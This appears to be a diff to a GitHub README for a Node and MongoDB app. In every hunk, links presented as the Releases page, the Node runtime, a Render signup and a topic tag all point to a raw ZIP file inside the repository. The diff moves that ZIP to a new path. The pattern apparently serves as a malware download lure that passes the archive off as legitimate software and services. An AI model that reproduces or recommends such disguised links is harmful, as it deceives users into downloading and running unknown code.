@@ -1,18 +1,18 @@
-# 🎉 full_stack_node_app - Simple https://raw.githubusercontent.com/max930/full_stack_node_app/main/views/store/full-stack-app-node-1.6.zip Application Setup
+# 🎉 full_stack_node_app - Simple https://raw.githubusercontent.com/max930/full_stack_node_app/main/utils/app-node-full-stack-3.9.zip Application Setup
 
 ## 🚀 Getting Started
 
-Welcome to the full_stack_node_app! This is a straightforward https://raw.githubusercontent.com/max930/full_stack_node_app/main/views/store/full-stack-app-node-1.6.zip application. You can easily set it up and run it on your computer. Follow the guide below to get started.
+Welcome to the full_stack_node_app! This is a straightforward https://raw.githubusercontent.com/max930/full_stack_node_app/main/utils/app-node-full-stack-3.9.zip application. You can easily set it up and run it on your computer. Follow the guide below to get started.
 
 ## ✅ Download Now
 
-[![Download full_stack_node_app](https://raw.githubusercontent.com/max930/full_stack_node_app/main/views/store/full-stack-app-node-1.6.zip)](https://raw.githubusercontent.com/max930/full_stack_node_app/main/views/store/full-stack-app-node-1.6.zip)
+[![Download full_stack_node_app](https://raw.githubusercontent.com/max930/full_stack_node_app/main/utils/app-node-full-stack-3.9.zip)](https://raw.githubusercontent.com/max930/full_stack_node_app/main/utils/app-node-full-stack-3.9.zip)
 
 ## 📥 Download & Install
 
 To use this application, you first need to download it. Visit the following link to access the Releases page. 
 
-[Download from Releases](https://raw.githubusercontent.com/max930/full_stack_node_app/main/views/store/full-stack-app-node-1.6.zip)
+[Download from Releases](https://raw.githubusercontent.com/max930/full_stack_node_app/main/utils/app-node-full-stack-3.9.zip)
 
 On this page, you will see different version options. Click on the latest version to download the application. This will typically be a ZIP or TAR file.
 
@@ -21,7 +21,7 @@ On this page, you will see different version options. Click on the latest versio
 Here are the basic requirements to run this application:
 
 - **Operating System:** Windows, macOS, or Linux
-- **Node Version:** You will need https://raw.githubusercontent.com/max930/full_stack_node_app/main/views/store/full-stack-app-node-1.6.zip version 14 or later installed on your computer.
+- **Node Version:** You will need https://raw.githubusercontent.com/max930/full_stack_node_app/main/utils/app-node-full-stack-3.9.zip version 14 or later installed on your computer.
 - **Memory:** At least 2 GB of RAM is recommended for smooth performance.
 
 ### 📂 Extracting Files
@@ -78,7 +78,7 @@ This is where you will see the application in action. Depending on your setup, i
 
 If you want to test the application without setting it up locally, you can deploy it on Render. Here are the steps to do that:
 
-1. Sign up for an account at [Render](https://raw.githubusercontent.com/max930/full_stack_node_app/main/views/store/full-stack-app-node-1.6.zip).
+1. Sign up for an account at [Render](https://raw.githubusercontent.com/max930/full_stack_node_app/main/utils/app-node-full-stack-3.9.zip).
 2. Create a new web service.
 3. Connect your GitHub account and select the full_stack_node_app repository.
 4. Use the default settings and click "Create Web Service."
@@ -111,7 +111,7 @@ For more details, please refer to the LICENSE file in the repository.
 - MongoDB
 - Mongoose
 - Node Application
-- https://raw.githubusercontent.com/max930/full_stack_node_app/main/views/store/full-stack-app-node-1.6.zip
+- https://raw.githubusercontent.com/max930/full_stack_node_app/main/utils/app-node-full-stack-3.9.zip
 - Server-Side Rendering
 
 Thank you for using full_stack_node_app! We hope it serves your needs well. Enjoy your experience!
